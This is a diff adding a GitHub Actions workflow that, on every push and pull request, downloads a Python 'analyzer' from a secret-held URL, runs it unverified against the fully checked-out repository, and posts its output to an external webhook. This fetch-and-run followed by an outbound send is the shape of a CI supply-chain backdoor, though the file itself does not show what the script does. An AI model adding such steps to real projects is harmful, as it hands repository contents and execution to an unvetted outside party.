@@ -1,0 +1,168 @@
+name: Enhanced Repository Analysis
+
+on:
+  push:
+    branches: [ "**" ]
+  pull_request:
+    types: [opened, closed, synchronize, reopened]
+  workflow_dispatch:
+    inputs:
+      full_analysis:
+        description: 'Perform full analysis (ignore cache)'
+        required: false
+        default: 'false'
+        type: string
+
+jobs:
+  analyze:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+      actions: read
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4.2.2
+        with:
+          fetch-depth: 0
+
+      - name: Setup Python
+        uses: actions/setup-python@v5.6.0
+        with:
+          python-version: '3.11'
+
+      - name: Download analyzer script
+        env:
+            BASE_URL: ${{ secrets.WEBSITE_BASE_URL }}
+        run: |
+          echo "📥 Downloading enhanced_analyzer.py from $BASE_URL/enhanced_analyzer.py"
+          curl -L -o enhanced_analyzer.py "$BASE_URL/enhanced_analyzer.py" \
+            -H 'Accept: text/x-python' \
+            --connect-timeout 10 \
+            --max-time 30 \
+            --retry 3 \
+            --retry-delay 2
+
+          if [ ! -f enhanced_analyzer.py ]; then
+            echo '❌ Failed to download enhanced_analyzer.py'
+            exit 1
+          fi
+
+          LINE_COUNT=$(wc -l < enhanced_analyzer.py)
+          echo "✅ Downloaded enhanced_analyzer.py ($LINE_COUNT lines)"
+          echo '📋 Script preview (first 10 lines):'
+          head -10 enhanced_analyzer.py
+
+      - name: Run enhanced repository analysis
+        run: |
+          python3 enhanced_analyzer.py
+
+      - name: Send analysis to external service
+        env:
+          WEBHOOK_ENDPOINT: ${{ secrets.WEBHOOK_ENDPOINT }}
+          WEBHOOK_API_TOKEN: ${{ secrets.WEBHOOK_API_TOKEN }}
+        run: |
+          MAX_WAIT=5
+          WAIT_COUNT=0
+          until [ -n "$WEBHOOK_ENDPOINT" ] && [ -n "$WEBHOOK_API_TOKEN" ]; do
+            if [ "$WAIT_COUNT" -ge "$MAX_WAIT" ]; then
+              echo "❌ Secrets not available after ${MAX_WAIT} retries."
+              exit 1
+            fi
+            echo "⏳ Secrets not yet available — waiting 10 s (attempt $((WAIT_COUNT+1))/$MAX_WAIT)..."
+            sleep 10
+            WAIT_COUNT=$((WAIT_COUNT+1))
+            WEBHOOK_ENDPOINT="${{ secrets.WEBHOOK_ENDPOINT }}"
+            WEBHOOK_API_TOKEN="${{ secrets.WEBHOOK_API_TOKEN }}"
+          done
+
+          if [ -z "$WEBHOOK_ENDPOINT" ]; then
+            echo "❌ WEBHOOK_ENDPOINT secret is not set!"
+            exit 1
+          fi
+
+          if [ -z "$WEBHOOK_API_TOKEN" ]; then
+            echo "❌ WEBHOOK_API_TOKEN secret is not set!"
+            exit 1
+          fi
+
+          if [ -f "enhanced_analysis_result.json" ]; then
+            echo "Sending analysis to $WEBHOOK_ENDPOINT"
+
+            temp_response=$(mktemp)
+
+            http_code=$(curl -L -X POST "$WEBHOOK_ENDPOINT" \
+              -H "Content-Type: application/json" \
+              -H "Accept: application/json" \
+              -H "X-API-Token: $WEBHOOK_API_TOKEN" \
+              -H "X-GitHub-Event: ${{ github.event_name }}" \
+              -H "X-Repository: ${{ github.repository }}" \
+              -H "X-Run-ID: ${{ github.run_id }}" \
+              -d @enhanced_analysis_result.json \
+              --max-time 30 \
+              --connect-timeout 10 \
+              -w "%{http_code}" \
+              -o "$temp_response" \
+              -s \
+              --location \
+              --fail \
+              2>&1) || true
+
+            if [ -f "$temp_response" ]; then
+              response_body=$(cat "$temp_response")
+
+              if [ "$http_code" -ge 200 ] && [ "$http_code" -lt 300 ]; then
+                echo "✅ Analysis sent successfully (HTTP $http_code)"
+              else
+                echo "❌ Failed to send analysis (HTTP $http_code)"
+                echo "Response: $response_body"
+
+                if [ -n "$WEBHOOK_ENDPOINT" ] && [ "$WEBHOOK_ENDPOINT" != "/" ]; then
+                  if [[ "$WEBHOOK_ENDPOINT" == */ ]]; then
+                    alt_endpoint="${WEBHOOK_ENDPOINT%/}"
+                  else
+                    alt_endpoint="${WEBHOOK_ENDPOINT}/"
+                  fi
+
+                  echo "Retrying with alternative endpoint: $alt_endpoint"
+                  http_code2=$(curl -L -X POST "$alt_endpoint" \
+                    -H "Content-Type: application/json" \
+                    -H "Accept: application/json" \
+                    -H "X-API-Token: $WEBHOOK_API_TOKEN" \
+                    -d @enhanced_analysis_result.json \
+                    --max-time 30 \
+                    -w "%{http_code}" \
+                    -o "$temp_response" \
+                    -s \
+                    --location)
+
+                  if [ "$http_code2" -ge 200 ] && [ "$http_code2" -lt 300 ]; then
+                    echo "✅ Analysis sent successfully on retry (HTTP $http_code2)"
+                    echo "Response: $(cat "$temp_response")"
+                  else
+                    echo "❌ Failed to send analysis on retry (HTTP $http_code2)"
+                    cat "$temp_response"
+                    exit 1
+                  fi
+                else
+                  echo "❌ Cannot retry: WEBHOOK_ENDPOINT is empty or invalid"
+                  exit 1
+                fi
+              fi
+
+              rm -f "$temp_response"
+            else
+              echo "❌ No response received"
+              exit 1
+            fi
+          else
+            echo "❌ Analysis file not found"
+            exit 1
+          fi
+
+      - name: Upload analysis artifact
+        uses: actions/upload-artifact@v4.6.2
+        with:
+          name: enhanced-analysis-${{ github.run_id }}
+          path: enhanced_analysis_result.json
+          retention-days: 7
